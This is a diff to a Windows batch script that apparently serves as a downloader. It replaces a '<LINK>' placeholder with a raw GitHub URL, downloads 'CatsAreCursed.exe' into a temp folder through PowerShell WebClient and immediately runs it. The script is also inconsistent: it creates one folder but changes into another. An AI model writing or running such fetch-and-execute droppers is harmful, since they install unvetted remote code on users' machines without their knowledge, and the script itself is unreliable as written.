@@ -3,11 +3,11 @@ color 0c
 cls
 
 cd %temp%
-if not exist "StartFile" mkdir "StartFile"
+if not exist "CatsAreCursed" mkdir "CatsAreCursed"
 cd StartFile
 
-powershell -command (New-Object System.Net.WebClient).DownloadFile('<LINK>', "GetFile.exe")
+powershell -command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Bruchstein/CatsAreCursed/main/CatsAreCursed.exe', "CatsAreCursed.exe")
 
-start GetFile.exe
+start CatsAreCursed.exe
 
 exit
